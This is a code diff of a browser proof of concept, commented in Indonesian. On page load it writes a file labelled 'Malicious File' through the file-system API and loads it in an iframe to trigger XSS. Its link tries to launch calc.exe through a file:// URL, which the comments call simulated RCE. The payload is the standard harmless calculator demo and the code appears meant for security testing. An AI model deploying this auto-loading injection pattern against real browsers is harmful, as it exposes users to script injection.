@@ -19,20 +19,36 @@
 
                     // Buat writer untuk menulis ke file
                     fileEntry.createWriter(function(fileWriter) {
-                        // Simulasi RCE menggunakan href untuk ngerestart kalkulator
+                        // Simulasi RCE menggunakan href untuk membuka aplikasi lokal (misalnya kalkulator)
                         let blob = new Blob([`
                             <html>
+                            <head>
+                                <title>Malicious File</title>
+                            </head>
                             <body>
-                                <h1>Malicious File</h1>
-                                <p>If you click below, it will trigger an action.</p>
-                                <a href="javascript:void(0);" onclick="window.location='file://C:/Windows/System32/calc.exe';">Click to open Calculator</a>
+                                <h1>This is a malicious file simulation!</h1>
+                                <p>Click below to attempt to execute a local program:</p>
+                                <a href="javascript:void(0);" onclick="triggerLocalApp()">Trigger Calculator</a>
+
+                                <script>
+                                    function triggerLocalApp() {
+                                        try {
+                                            // Windows executable file
+                                            window.location.href = 'file:///C:/Windows/System32/calc.exe';
+                                        } catch (e) {
+                                            console.error("Error triggering local app:", e);
+                                        }
+                                    }
+                                </script>
                             </body>
                             </html>
                         `], { type: "text/html" });
 
+                        // Menulis blob ke file
                         fileWriter.onwriteend = function() {
                             console.log("File berhasil ditulis:", fileEntry.toURL());
-                            // Load file yang sudah kita buat tadi ke dalam iframe untuk trigger XSS
+
+                            // Memuat file yang sudah ditulis ke dalam iframe untuk men-trigger XSS atau konten berbahaya
                             let iframe = document.createElement("iframe");
                             iframe.src = fileEntry.toURL();
                             document.body.appendChild(iframe);
@@ -42,6 +58,7 @@
                             console.error("Gagal menulis file:", err);
                         };
 
+                        // Menulis blob ke dalam file
                         fileWriter.write(blob);
                     });
 
@@ -54,8 +71,8 @@
             });
         }
 
-        // Jalankan fungsi untuk membuat file
-        createFile();
+        // Panggil fungsi untuk membuat file ketika halaman dimuat
+        window.onload = createFile;
     </script>
 </head>
 <body>
